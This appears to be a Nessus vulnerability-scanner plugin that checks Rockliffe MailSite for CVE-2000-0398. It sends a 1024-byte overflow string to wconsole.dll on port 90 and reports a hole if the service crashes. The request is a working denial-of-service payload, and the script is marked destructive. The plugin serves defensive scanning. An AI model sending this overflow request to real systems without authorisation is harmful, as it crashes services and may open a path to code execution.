#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#


if(description)
{
 script_id(10421);
 script_bugtraq_id(1244);
 script_version ("$Revision: 1.17 $");
 script_cve_id("CVE-2000-0398");
 name["english"] = "Rockliffe's MailSite overflow";
 name["francais"] = "Dépassement de buffer dans MailSite de RockLiffe";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
The remote Rockliffe MailSite is subject to a buffer
overflow when issued the request :

	GET /cgi-bin/wconsole.dll?AAAA....AAAA
	
This may be of some use to an attacker to run arbitrary code
on this system and/or deactivate it.

Solution : Upgrade to version 4.2.2 of this software
Risk factor : High";

 desc["francais"] = "
Le service 'MailSite' distant est vulnérable à un dépassement
de buffer lorsqu'on lui fait la requete :

	GET /cgi-bin/wconsole.dll?AAAA....AAAA
	
Un pirate peut s'en servir pour injecter du code arbitraire
sur ce système et/ou desactiver ce service.

Solution : Mettez MailSite à jour en version 4.2.2
Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "MaiLSite buffer overflow";
 summary["francais"] = "Dépassement de buffer dans MaiLSite";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "Gain root remotely";
 family["francais"] = "Passer root à distance";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "www_too_long_url.nasl", "http_version.nasl");
 script_require_ports(90);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = 90;

if(get_port_state(port))
{
 foreach dir (cgi_dirs())
 {
 data = string(dir, "/wconsole.dll?", crap(1024));
 data = http_get(item:data, port:port);
 r = http_keepalive_send_recv(port:port, data:data);
 if ( r == NULL ) exit(0);
 if(http_is_dead(port:port))security_hole(port);
 }
}
